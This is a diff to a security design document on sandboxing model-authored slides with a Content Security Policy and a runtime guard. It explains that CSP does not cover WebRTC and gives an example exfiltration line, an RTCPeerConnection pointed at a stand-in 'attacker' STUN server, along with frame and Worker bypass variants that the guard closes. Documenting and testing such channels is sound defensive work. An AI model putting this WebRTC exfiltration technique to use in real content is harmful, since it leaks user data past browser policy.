@@ -381,7 +381,7 @@ It is contained at four layers.
 ```
 default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
 img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self';
-frame-src 'self' blob: slide:; object-src 'none'; base-uri 'none'; form-action 'none';
+frame-src blob: slide:; object-src 'none'; base-uri 'none'; form-action 'none';
 ```
 
 `frame-src` is the one directive M2.0 had to widen, and the one CSP decision `slide://` delivery does
@@ -492,11 +492,29 @@ img-src data: blob:; font-src data:; media-src data: blob:;
 connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none';
 ```
 
-`connect-src 'none'` is the important one: a slide cannot phone home, exfiltrate deck content, or
-pull remote code. `'unsafe-inline'` for script/style is unavoidable (the whole point is inline
-model-authored `<script>`/`<style>`), but with `default-src 'none'` + no same-origin it buys the
-attacker nothing beyond their own opaque document. All assets are inlined as data URIs at document
-assembly time — see [30-slide-format.md](30-slide-format.md).
+`connect-src 'none'` is the important one for the channels CSP governs — fetch, XHR, WebSocket,
+EventSource, `sendBeacon`, and every subresource: with it a slide cannot phone home, exfiltrate deck
+content, or pull remote code through any of those. `'unsafe-inline'` for script/style is unavoidable
+(the whole point is inline model-authored `<script>`/`<style>`), but with `default-src 'none'` + no
+same-origin it buys the attacker nothing beyond their own opaque document. All assets are inlined as
+data URIs at document assembly time — see [30-slide-format.md](30-slide-format.md).
+
+> **CSP does not cover WebRTC — layer 3 is CSP *plus* a runtime guard (M2.0).** No CSP directive
+> governs WebRTC (`webrtc-src` was proposed and never shipped), so `connect-src 'none'` does nothing
+> to a slide that constructs `new RTCPeerConnection({iceServers:[{urls:'stun:attacker'}]})` —
+> measured, five real STUN Binding Requests left a running `slide://` slide onto a loopback UDP
+> socket, with the attacker controlling the ICE-server host (and, for TURN, `username`/`credential`)
+> as an exfiltration primitive. Before M2.0 this was unreachable, because inline slide JS did not
+> execute at all; making it execute is the milestone, and it opened this. It is closed by
+> `wrapSlideHtml`'s injected bootstrap (`SLIDE_RUNTIME_GUARD`), which defines `RTCPeerConnection`
+> (and its `webkit`/`moz` aliases, `RTCDataChannel`, and `WebTransport`) as non-configurable
+> `undefined` before author script runs. The `about:blank`-child-frame resurrection bypass fails
+> because `frame-src 'none'` forbids the frame and the slide's opaque origin makes any frame it
+> created opaque too; the Worker variant fails on `default-src 'none'`. Proven both ways by
+> [`slide-protocol-smoke.mjs`](../../../experiments/init/harness/slide-protocol-smoke.mjs) probe 7:
+> zero packets with the guard, real STUN packets with it reverted. So the "no network" guarantee is
+> CSP **and** the guard, not CSP alone; the other 22 channels swept (fetch/XHR/WebSocket/beacon/
+> subresources/self-navigation/window.open/nested frames/…) are all closed by CSP + `frame-src`.
 
 **Layer 4 — the host↔slide protocol.** The only channel is `window.postMessage` between the frame
 and `SlideFrame.tsx`, with:
